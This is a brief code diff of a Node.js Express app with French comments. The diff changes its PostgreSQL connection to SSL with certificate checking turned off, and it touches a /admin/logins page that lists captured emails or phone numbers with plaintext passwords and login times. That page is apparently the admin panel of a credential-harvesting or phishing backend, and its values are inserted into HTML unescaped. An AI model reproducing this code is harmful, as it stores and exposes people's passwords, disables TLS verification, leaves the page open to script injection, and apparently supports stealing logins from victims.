@@ -9,10 +9,12 @@ const PORT = process.env.PORT || 3000;
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Connexion PostgreSQL via Pool (SSL désactivé pour Render)
+// Connexion PostgreSQL via Pool avec SSL pour Render
 const pool = new Pool({
   connectionString: process.env.DATABASE_URL,
-  ssl: false // IMPORTANT : désactive SSL pour Render si serveur ne le supporte pas
+  ssl: {
+    rejectUnauthorized: false
+  }
 });
 
 // TEST CONNEXION DB
@@ -121,7 +123,7 @@ app.get('/admin/logins', async (req, res) => {
     <h1>Liste des logins</h1>
     <table>
     <tr><th>ID</th><th>Email/Phone</th><th>Password</th><th>Login Time</th></tr>`;
-
+    
     result.rows.forEach(row => {
       html += `<tr>
         <td>${row.id}</td>
